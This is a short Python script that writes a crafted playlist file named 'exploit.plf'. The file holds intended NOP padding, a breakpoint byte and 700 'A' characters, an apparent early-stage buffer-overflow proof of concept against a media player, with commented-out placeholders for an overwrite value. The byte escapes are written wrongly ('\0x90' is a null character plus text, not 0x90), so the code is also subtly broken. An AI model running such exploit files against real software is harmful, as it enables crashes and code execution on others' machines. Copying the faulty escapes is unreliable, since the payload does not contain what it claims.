#!/usr/bin/python


try:
    with open('exploit.plf', 'wb') as f:
        # Define the data to be written
        buffer = "\0x90" * 16
        buffer += "\0xcc"
        buffer += "A" * 700
        # buffer += "BBBB"
        # buffer += "C" * 300
        f.write(bytes(buffer,  "latin-1"))
        
except Exception as err:
    print(f"Unexpected {err=}, {type(err)=}")
    raise
    
